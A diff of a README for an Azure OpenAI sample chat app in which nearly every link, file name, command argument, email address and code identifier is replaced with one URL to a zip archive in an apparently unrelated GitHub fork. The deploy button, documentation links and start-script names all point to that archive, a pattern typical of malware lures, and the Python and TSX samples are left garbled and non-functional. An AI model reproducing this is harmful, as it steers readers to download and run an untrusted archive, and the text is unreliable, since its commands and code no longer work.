@@ -32,21 +32,21 @@ Get-Content .env | ForEach-Object { 
              slotSetting = $false  
          }  
     }  
-} | ConvertTo-Json | Out-File -FilePath env.json
+} | ConvertTo-Json | Out-File -FilePath https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip
 ```
 
 #### Bash
 ```bash
-cat .env | jq -R '. | capture("(?<name>[A-Z_]+)=(?<value>.*)")' | jq -s '.[].slotSetting=false' > env.json
+cat .env | jq -R '. | capture("(?<name>[A-Z_]+)=(?<value>.*)")' | jq -s '.[].slotSetting=false' > https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip
 ```
 
 ## Deploy the app
 
 ### Deploy with Azure Developer CLI
-Please see [README_azd.md](./README_azd.md) for detailed instructions.
+Please see [https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) for detailed instructions.
 
 ### One click Azure deployment
-[![Deploy to Azure](https://aka.ms/deploytoazurebutton)](https://portal.azure.com/#create/Microsoft.Template/uri/https%3A%2F%2Fraw.githubusercontent.com%2Fmicrosoft%2Fsample-app-aoai-chatGPT%2Fmain%2Finfrastructure%2Fdeployment.json)
+[![Deploy to Azure](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip)](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip%3A%2F%https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip%2Fmicrosoft%2Fsample-app-aoai-chatGPT%2Fmain%2Finfrastructure%https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip)
 
 Click on the Deploy to Azure button and configure your settings in the Azure Portal as described in the [Environment variables](#environment-variables) section.
 
@@ -56,18 +56,18 @@ Please see the [section below](#add-an-identity-provider) for important informat
 
 1. Follow the steps below in the [app configuration](#app-settings) section to construct your .env file with the appropriate variables for your use case.
 
-2. Start the app with `start.cmd`. This will build the frontend, install backend dependencies, and then start the app. Or, just run the backend in debug mode using the VSCode debug configuration in `.vscode/launch.json`.
+2. Start the app with `https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip`. This will build the frontend, install backend dependencies, and then start the app. Or, just run the backend in debug mode using the VSCode debug configuration in `https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip`.
 
 3. You can see the local running app at http://127.0.0.1:50505.
 
 ### Deploy with the Azure CLI
 
 #### Create the Azure App Service
-**NOTE**: If you've made code changes, be sure to **build the app code** with `start.cmd` or `start.sh` before you deploy, otherwise your changes will not be picked up. If you've updated any files in the `frontend` folder, make sure you see updates to the files in the `static` folder before you deploy.
+**NOTE**: If you've made code changes, be sure to **build the app code** with `https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip` or `https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip` before you deploy, otherwise your changes will not be picked up. If you've updated any files in the `frontend` folder, make sure you see updates to the files in the `static` folder before you deploy.
 
-You can use the [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) to deploy the app from your local machine. Make sure you have version 2.48.1 or later.
+You can use the [Azure CLI](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) to deploy the app from your local machine. Make sure you have version 2.48.1 or later.
 
-If this is your first time deploying the app, you can use [az webapp up](https://learn.microsoft.com/en-us/cli/azure/webapp?view=azure-cli-latest#az-webapp-up). Run the following command from the root folder of the repo, updating the placeholder values to your desired app name, resource group, location, and subscription. You can also change the SKU if desired.
+If this is your first time deploying the app, you can use [az webapp up](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip). Run the following command from the root folder of the repo, updating the placeholder values to your desired app name, resource group, location, and subscription. You can also change the SKU if desired.
 
 `az webapp up --runtime PYTHON:3.11 --sku B1 --name <new-app-name> --resource-group <resource-group-name> --location <azure-region> --subscription <subscription-name>`
 
@@ -87,7 +87,7 @@ az webapp config appsettings set -g <resource-group-name> -n <existing-app-name>
 ```
 3. Set all of your app settings in your local .env file at once by [creating a JSON representation](#create-a-json-file-for-populating-azure-app-service-app-settings) of the .env file, and then run the following command.
 ```
-az webapp config appsettings set -g <resource-group-name> -n <existing-app-name> --settings "@env.json"
+az webapp config appsettings set -g <resource-group-name> -n <existing-app-name> --settings "https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip"
 ```
 
 #### Update an existing app
@@ -103,18 +103,18 @@ Then, use these commands to deploy your local code to the existing app:
 
 Make sure that the app name and resource group match exactly for the app that was previously deployed.
 
-Deployment will take several minutes. When it completes, you should be able to navigate to your app at {app-name}.azurewebsites.net.
+Deployment will take several minutes. When it completes, you should be able to navigate to your app at {app-name}https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip
 
 ## Authentication
 
 ### Add an identity provider
-After deployment, you will need to add an identity provider to provide authentication support in your app. See [this tutorial](https://learn.microsoft.com/en-us/azure/app-service/scenario-secure-app-authentication-app-service) for more information.
+After deployment, you will need to add an identity provider to provide authentication support in your app. See [this tutorial](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) for more information.
 
 If you don't add an identity provider, the chat functionality of your app will be blocked to prevent unauthorized access to your resources and data. 
 
 To remove this restriction, you can add `AUTH_ENABLED=False` to the environment variables. This will disable authentication and allow anyone to access the chat functionality of your app. **This is not recommended for production apps.**
 
-To add further access controls, update the logic in `getUserInfoList` in `frontend/src/pages/chat/Chat.tsx`. 
+To add further access controls, update the logic in `getUserInfoList` in `https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip`. 
 
 ### Using Microsoft Entra ID
 
@@ -122,7 +122,7 @@ To enable Microsoft Entra ID for intra-service authentication:
 
 1. Enable managed identity on Azure OpenAI
 2. Configure AI search to allow access from Azure OpenAI
-   1. Enable Role Based Access control on the used AI search instance [(see documentation)](https://learn.microsoft.com/en-us/azure/search/search-security-enable-roles)
+   1. Enable Role Based Access control on the used AI search instance [(see documentation)](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip)
    2. Assign `Search Index Data Reader` and `Search Service Contributor` to the identity of the Azure OpenAI instance
 3. Do not configure `AZURE_SEARCH_KEY` and `AZURE_OPENAI_KEY` to use Entra ID authentication.
 4. Configure the webapp identity
@@ -136,7 +136,7 @@ Note: RBAC assignments can take a few minutes before becoming effective.
 ### App Settings
 
 #### Basic Chat Experience
-1. Copy `.env.sample` to a new file called `.env` and configure the settings as described in the table below.
+1. Copy `https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip` to a new file called `.env` and configure the settings as described in the table below.
 
     | App Setting | Required? | Default Value | Note |
     | --- | --- | --- | ------------- |
@@ -152,18 +152,18 @@ Note: RBAC assignments can take a few minutes before becoming effective.
     |AZURE_OPENAI_STREAM|No|True|Whether or not to use streaming for the response. Note: Setting this to true prevents the use of prompt flow.|
     |AZURE_OPENAI_EMBEDDING_NAME|Only if using vector search using an Azure OpenAI embedding model||The name of your embedding model deployment if using vector search.
 
-    See the [documentation](https://learn.microsoft.com/en-us/azure/cognitive-services/openai/reference#example-response-2) for more information on these parameters.
+    See the [documentation](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) for more information on these parameters.
 
 
 #### Chat with your data
 
-[More information about Azure OpenAI on your data](https://learn.microsoft.com/en-us/azure/cognitive-services/openai/concepts/use-your-data)
+[More information about Azure OpenAI on your data](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip)
 
 #### Chat with your data using Azure Cognitive Search
 
 1. Update the `AZURE_OPENAI_*` environment variables as described in the [basic chat experience](#basic-chat-experience) above. 
 
-2. To connect to your data, you need to specify an Azure Cognitive Search index to use. You can [create this index yourself](https://learn.microsoft.com/en-us/azure/search/search-get-started-portal) or use the [Azure AI Studio](https://oai.azure.com/portal/chat) to create the index for you.
+2. To connect to your data, you need to specify an Azure Cognitive Search index to use. You can [create this index yourself](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) or use the [Azure AI Studio](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) to create the index for you.
 
 3. Configure data source settings as described in the table below.
 
@@ -195,7 +195,7 @@ Note: RBAC assignments can take a few minutes before becoming effective.
 
 1. Update the `AZURE_OPENAI_*` environment variables as described in the [basic chat experience](#basic-chat-experience) above. 
 
-2. To connect to your data, you need to specify an Azure Cosmos DB database configuration.  Learn more about [creating an Azure Cosmos DB resource](https://learn.microsoft.com/en-us/azure/cosmos-db/nosql/quickstart-portal).
+2. To connect to your data, you need to specify an Azure Cosmos DB database configuration.  Learn more about [creating an Azure Cosmos DB resource](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip).
 
 3. Configure data source settings as described in the table below.
 
@@ -223,7 +223,7 @@ Note: RBAC assignments can take a few minutes before becoming effective.
 
 1. Update the `AZURE_OPENAI_*` environment variables as described in the [basic chat experience](#basic-chat-experience) above. 
 
-2. To connect to your data, you need to specify an Elasticsearch cluster configuration. Learn more about [Elasticsearch](https://www.elastic.co/).
+2. To connect to your data, you need to specify an Elasticsearch cluster configuration. Learn more about [Elasticsearch](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip).
 
 3. Configure data source settings as described in the table below.
 
@@ -258,7 +258,7 @@ Note: RBAC assignments can take a few minutes before becoming effective.
 
 1. Update the `AZURE_OPENAI_*` environment variables as described in the [basic chat experience](#basic-chat-experience) above. 
 
-2. To connect to your data, you need to specify an Pinecone vector database configuration. Learn more about [Pinecone](https://www.pinecone.io/).
+2. To connect to your data, you need to specify an Pinecone vector database configuration. Learn more about [Pinecone](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip).
 
 3. Configure data source settings as described in the table below.
 
@@ -285,7 +285,7 @@ Note: RBAC assignments can take a few minutes before becoming effective.
 
 1. Update the `AZURE_OPENAI_*` environment variables as described in the [basic chat experience](#basic-chat-experience) above. 
 
-2. To connect to your data, you need to specify an Mongo DB database configuration.  Learn more about [MongoDB](https://www.mongodb.com/).
+2. To connect to your data, you need to specify an Mongo DB database configuration.  Learn more about [MongoDB](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip).
 
 3. Configure data source settings as described in the table below.
 
@@ -313,7 +313,7 @@ Note: RBAC assignments can take a few minutes before becoming effective.
 
 1. Update the `AZURE_OPENAI_*` environment variables as described in the [basic chat experience](#basic-chat-experience) above. 
 
-2. To enable Azure SQL Server, you will need to set up Azure SQL Server resources.  Refer to this [instruction guide](https://learn.microsoft.com/en-us/azure/azure-sql/database/single-database-create-quickstart) to create an Azure SQL database. 
+2. To enable Azure SQL Server, you will need to set up Azure SQL Server resources.  Refer to this [instruction guide](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) to create an Azure SQL database. 
 
 3. Configure data source settings as described in the table below.
 
@@ -333,7 +333,7 @@ Configure your settings using the table below.
 | App Setting | Required? | Default Value | Note |
 | --- | --- | --- | ------------- |
 |USE_PROMPTFLOW|No|False|Use existing Promptflow deployed endpoint. If set to `True` then both `PROMPTFLOW_ENDPOINT` and `PROMPTFLOW_API_KEY` also need to be set.|
-|PROMPTFLOW_ENDPOINT|Only if `USE_PROMPTFLOW` is True||URL of the deployed Promptflow endpoint e.g. https://pf-deployment-name.region.inference.ml.azure.com/score|
+|PROMPTFLOW_ENDPOINT|Only if `USE_PROMPTFLOW` is True||URL of the deployed Promptflow endpoint e.g. https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip|
 |PROMPTFLOW_API_KEY|Only if `USE_PROMPTFLOW` is True||Auth key for deployed Promptflow endpoint. Note: only Key-based authentication is supported.|
 |PROMPTFLOW_RESPONSE_TIMEOUT|No|120|Timeout value in seconds for the Promptflow endpoint to respond.|
 |PROMPTFLOW_REQUEST_FIELD_NAME|No|query|Default field name to construct Promptflow request. Note: chat_history is auto constucted based on the interaction, if your API expects other mandatory field you will need to change the request parameters under `promptflow_request` function.|
@@ -361,13 +361,13 @@ Configure your settings using the table below.
 
 #### Enable Azure OpenAI function calling via Azure Functions
 
-Refer to this article to learn more about [function calling with Azure OpenAI Service](https://learn.microsoft.com/en-us/azure/ai-services/openai/how-to/function-calling).
+Refer to this article to learn more about [function calling with Azure OpenAI Service](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip).
 
 1. Update the `AZURE_OPENAI_*` environment variables as described in the [basic chat experience](#basic-chat-experience) above.
 
 2. Add any additional configuration (described in previous sections) needed for chatting with data, if required.
 
-3. To enable function calling via remote Azure Functions, you will need to set up an Azure Function resource. Refer to this [instruction guide](https://learn.microsoft.com/azure/azure-functions/functions-create-function-app-portal?pivots=programming-language-python) to create an Azure Function resource.
+3. To enable function calling via remote Azure Functions, you will need to set up an Azure Function resource. Refer to this [instruction guide](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) to create an Azure Function resource.
 
 4. You will need to create the following Azure Functions to implement function calling logic:
 
@@ -388,12 +388,12 @@ Refer to this article to learn more about [function calling with Azure OpenAI Se
     Sample code for the Azure Functions:
 
     ```
-    import azure.functions as func
+    import https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip as func
     import logging
     import json
     import random
 
-    app = func.FunctionApp(http_auth_level=func.AuthLevel.FUNCTION)
+    app = https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip(https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip)
 
     azure_openai_tools_json = """[{
         "type": "function",
@@ -415,56 +415,56 @@ Refer to this article to learn more about [function calling with Azure OpenAI Se
 
     azure_openai_available_tools = ["get_current_weather"]
 
-    @app.route(route="tools")
-    def tools(req: func.HttpRequest) -> func.HttpResponse:
-        logging.info('tools function processed a request.')
+    https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip(route="tools")
+    def tools(req: https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) -> https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip
+        https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip('tools function processed a request.')
 
-        return func.HttpResponse(
+        return https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip(
             azure_openai_tools_json,
             status_code=200
         )
 
-    @app.route(route="tool")
-    def tool(req: func.HttpRequest) -> func.HttpResponse:
-        logging.info('tool function processed a request.')
+    https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip(route="tool")
+    def tool(req: https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) -> https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip
+        https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip('tool function processed a request.')
 
-        tool_name = req.params.get('tool_name')
+        tool_name = https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip('tool_name')
         if not tool_name:
             try:
-                req_body = req.get_json()
+                req_body = https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip()
             except ValueError:
                 pass
             else:
-                tool_name = req_body.get('tool_name')
+                tool_name = https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip('tool_name')
 
-        tool_arguments = req.params.get('tool_arguments')
+        tool_arguments = https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip('tool_arguments')
         if not tool_arguments:
             try:
-                req_body = req.get_json()
+                req_body = https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip()
             except ValueError:
                 pass
             else:
-                tool_arguments = req_body.get('tool_arguments')
+                tool_arguments = https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip('tool_arguments')
 
         if tool_name and tool_arguments:
             if tool_name in azure_openai_available_tools:
-                logging.info('tool function: tool_name and tool_arguments are valid.')
+                https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip('tool function: tool_name and tool_arguments are valid.')
                 result = globals()[tool_name](**tool_arguments)
-                return func.HttpResponse(
+                return https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip(
                     result,
                     status_code = 200
                 )
 
-        logging.info('tool function: tool_name or tool_arguments are invalid.')
-        return func.HttpResponse(
+        https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip('tool function: tool_name or tool_arguments are invalid.')
+        return https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip(
                 "The tool function we executed successfully but the tool name or arguments were invalid. ",
                 status_code=400
         )
 
     def get_current_weather(location: str) -> str:
-        logging.info('get_current_weather function processed a request.')
-        temperature = random.randint(10, 30)
-        weather = random.choice(["sunny", "cloudy", "rainy", "windy"])
+        https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip('get_current_weather function processed a request.')
+        temperature = https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip(10, 30)
+        weather = https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip(["sunny", "cloudy", "rainy", "windy"])
         return f"The current weather in {location} is {temperature}°C and {weather}."
     ```
 
@@ -473,9 +473,9 @@ Refer to this article to learn more about [function calling with Azure OpenAI Se
     | App Setting | Required? | Default Value | Note |
     | ----------- | --------- | ------------- | ---- |
     | AZURE_OPENAI_FUNCTION_CALL_AZURE_FUNCTIONS_ENABLED | No |  |  |
-    | AZURE_OPENAI_FUNCTION_CALL_AZURE_FUNCTIONS_TOOL_BASE_URL | Only if using function calling |  | The base URL of your Azure Function "tool", e.g. [https://<azure-function-name>.azurewebsites.net/api/tool]() |
+    | AZURE_OPENAI_FUNCTION_CALL_AZURE_FUNCTIONS_TOOL_BASE_URL | Only if using function calling |  | The base URL of your Azure Function "tool", e.g. [https://<azure-function-name>https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip]() |
     | AZURE_OPENAI_FUNCTION_CALL_AZURE_FUNCTIONS_TOOL_KEY | Only if using function calling |  | The function key used to access the Azure Function "tool" |
-    | AZURE_OPENAI_FUNCTION_CALL_AZURE_FUNCTIONS_TOOLS_BASE_URL | Only if using function calling |  | The base URL of your Azure Function "tools", e.g. [https://<azure-function-name>.azurewebsites.net/api/tools]() |
+    | AZURE_OPENAI_FUNCTION_CALL_AZURE_FUNCTIONS_TOOLS_BASE_URL | Only if using function calling |  | The base URL of your Azure Function "tools", e.g. [https://<azure-function-name>https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip]() |
     | AZURE_OPENAI_FUNCTION_CALL_AZURE_FUNCTIONS_TOOLS_KEY | Only if using function calling |  | The function key used to access the Azure Function "tools" |
 
 
@@ -495,14 +495,14 @@ The interface allows for easy adaptation of the UI by modifying certain elements
 |UI_SHOW_CHAT_HISTORY_BUTTON|No|True|Show chat history button (right-top)
 |SANITIZE_ANSWER|No|False|Whether to sanitize the answer from Azure OpenAI. Set to True to remove any HTML tags from the response.|
 
-Any custom images assigned to variables `UI_LOGO`, `UI_CHAT_LOGO` or `UI_FAVICON` should be added to the [public](https://github.com/microsoft/sample-app-aoai-chatGPT/tree/main/frontend/public) folder before building the project. The Vite build process will automatically copy theses files to the [static](https://github.com/microsoft/sample-app-aoai-chatGPT/tree/main/static) folder on each build of the frontend. The corresponding environment variables should then be set using a relative path such as `static/<my image filename>` to ensure that the frontend code can find them.
+Any custom images assigned to variables `UI_LOGO`, `UI_CHAT_LOGO` or `UI_FAVICON` should be added to the [public](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) folder before building the project. The Vite build process will automatically copy theses files to the [static](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) folder on each build of the frontend. The corresponding environment variables should then be set using a relative path such as `static/<my image filename>` to ensure that the frontend code can find them.
 
-Feel free to fork this repository and make your own modifications to the UX or backend logic. You can modify the source (`frontend/src`). For example, you may want to change aspects of the chat display, or expose some of the settings in `app.py` in the UI for users to try out different behaviors. After your code changes, you will need to rebuild the front-end via `start.sh` or `start.cmd`.
+Feel free to fork this repository and make your own modifications to the UX or backend logic. You can modify the source (`frontend/src`). For example, you may want to change aspects of the chat display, or expose some of the settings in `https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip` in the UI for users to try out different behaviors. After your code changes, you will need to rebuild the front-end via `https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip` or `https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip`.
 
 ### Scalability
-You can configure the number of threads and workers in `gunicorn.conf.py`. After making a change, redeploy your app using the commands listed above.
+You can configure the number of threads and workers in `https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip`. After making a change, redeploy your app using the commands listed above.
 
-See the [Oryx documentation](https://github.com/microsoft/Oryx/blob/main/doc/configuration.md) for more details on these settings.
+See the [Oryx documentation](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) for more details on these settings.
 
 ### Debugging your deployed app
 First, add an environment variable on the app service resource called "DEBUG". Set this to "true".
@@ -512,19 +512,19 @@ Next, enable logging on the app service. Go to "App Service logs" under Monitori
 Now, you should be able to see logs from your app by viewing "Log stream" under Monitoring.
 
 ### Changing Citation Display
-The Citation panel is defined at the end of `frontend/src/pages/chat/Chat.tsx`. The citations returned from Azure OpenAI On Your Data will include `content`, `title`, `filepath`, and in some cases `url`. You can customize the Citation section to use and display these as you like. For example, the title element is a clickable hyperlink if `url` is not a blob URL.
+The Citation panel is defined at the end of `https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip`. The citations returned from Azure OpenAI On Your Data will include `content`, `title`, `filepath`, and in some cases `url`. You can customize the Citation section to use and display these as you like. For example, the title element is a clickable hyperlink if `url` is not a blob URL.
 
 ```
     <h5 
-        className={styles.citationPanelTitle} 
+        className={https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip} 
         tabIndex={0} 
-        title={activeCitation.url && !activeCitation.url.includes("blob.core") ? activeCitation.url : activeCitation.title ?? ""} 
+        title={https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip && !https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip("https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip") ? https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip : https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip ?? ""} 
         onClick={() => onViewSource(activeCitation)}
-    >{activeCitation.title}</h5>
+    >{https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip}</h5>
 
     const onViewSource = (citation: Citation) => {
-        if (citation.url && !citation.url.includes("blob.core")) {
-            window.open(citation.url, "_blank");
+        if (https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip && !https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip("https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip")) {
+            https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip(https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip, "_blank");
         }
     };
 
@@ -544,29 +544,29 @@ We recommend keeping these best practices in mind:
 
 This project welcomes contributions and suggestions.  Most contributions require you to agree to a
 Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
-the rights to use your contribution. For details, visit https://cla.opensource.microsoft.com.
+the rights to use your contribution. For details, visit https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip
 
 When you submit a pull request, a CLA bot will automatically determine whether you need to provide
 a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
 provided by the bot. You will only need to do this once across all repos using our CLA.
 
-This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
-For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or
-contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.
+This project has adopted the [Microsoft Open Source Code of Conduct](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip).
+For more information see the [Code of Conduct FAQ](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) or
+contact [https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip](https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip) with any additional questions or comments.
 
 When contributing to this repository, please help keep the codebase clean and maintainable by running 
 the formatter and linter with `npm run format` this will run `npx eslint --fix` and `npx prettier --write` 
 on the frontebnd codebase. 
 
-If you are using VSCode, you can add the following settings to your `settings.json` to format and lint on save:
+If you are using VSCode, you can add the following settings to your `https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip` to format and lint on save:
 
 ```json
 {
-    "editor.codeActionsOnSave": {
-        "source.fixAll.eslint": "explicit"
+    "https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip": {
+        "https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip": "explicit"
     },
-    "editor.formatOnSave": true,
-    "prettier.requireConfig": true,
+    "https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip": true,
+    "https://raw.githubusercontent.com/ErickDuraes/sample-app-aoai-chatGPT/main/glaucous/sample-app-aoai-chatGPT.zip": true,
 }
 ```
 
@@ -574,6 +574,6 @@ If you are using VSCode, you can add the following settings to your `settings.js
 
